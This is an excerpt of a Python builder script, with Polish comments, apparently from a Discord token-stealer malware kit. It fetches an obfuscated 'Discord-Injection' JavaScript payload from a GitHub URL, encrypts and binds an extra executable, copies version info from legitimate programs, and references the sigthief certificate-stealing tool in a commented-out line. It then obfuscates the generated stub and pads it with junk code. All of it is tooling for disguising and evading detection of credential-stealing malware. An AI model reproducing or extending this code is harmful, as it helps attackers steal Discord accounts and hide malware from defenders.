...
disable_warnings()
import LOGONOBF as obfuscator
# from sigthief import outputCert  # Zakomentowane

SettingsFile = "config.json"
InCodeFile = "stub.py"
OutCodeFile = "stub-o.py"
InjectionURL = "https://raw.githubusercontent.com/LOGON/Discord-Injection-BG/main/injection-obfuscated.js"
...
def PrepareEnvironment(settings: dict) -> None:
    if os.path.isfile("bound.exe"):
        ...
        with open("bound.logon", "wb") as file:
            file.write(encrypted)
        
    elif os.path.isfile("bound.logon"):
        os.remove("bound.logon")
...
def MakeVersionFileAndCert() -> None:
    ...
    if exeFiles:
        while(retries < 5):
            ...
            # Zamienione z pyi-grab_version na python -m PyInstaller.utils.cliutils.grab_version
            res = subprocess.run('python -m PyInstaller.utils.cliutils.grab_version "{}" version.txt'.format(exefile), shell= True, capture_output= True)
            if res.returncode != 0:
                retries += 1
            else:
                ...
                if any([(x.count("'") % 2 == 1 and not x.strip().startswith("#")) for x in content.splitlines()]):
                    ...
                    # outputCert(exefile, "cert")  # Zakomentowane
                    break
...
def main() -> None:
    ...
    obfuscator.LOGONOBF(code, OutCodeFile)
    junk(OutCodeFile)
